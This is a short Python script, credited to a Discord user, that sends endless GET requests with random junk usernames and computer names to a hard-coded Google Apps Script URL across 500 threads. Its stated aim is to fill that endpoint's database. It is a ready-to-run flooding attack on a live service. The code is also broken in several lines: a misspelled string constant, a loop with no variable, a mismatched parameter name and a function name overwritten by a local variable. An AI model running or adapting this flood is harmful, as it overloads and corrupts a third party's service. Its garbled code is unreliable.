print("script made by msgpack on discord")
import requests
import urllib.parse
import os
import random
import string
import threading
def username(length=5):
    return ''.join(random.choices(string.asciiuppercase + string.digits, k=length))

def boom():
  while True:
    username = f"FillTheDbUP{username()}"
    compName = f"holyyourobfuscation_sucks{username()}"
    encodedUser = urllib.parse.quote(username)
    encodedPC = urllib.parse.quote(compName)
    fullURL = f"https://script.google.com/macros/s/AKfycbys_0dn2UPA4fXqNgqqYIHnUxoDUIusA8BoIVSghSJ8BR7colxlDEYLhqvv4OVCE6Is/exec?username={encodedUser}&computer={encodedPC}"
    response = requests.get(fullURL)
    if response.status_code == 200:
        print("spammed", response.text)
    else:
      pass

def spam(numthreads=10):
    threads = []

    for  in range(num_threads):
        thread = threading.Thread(target=boom)
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

spam(500)
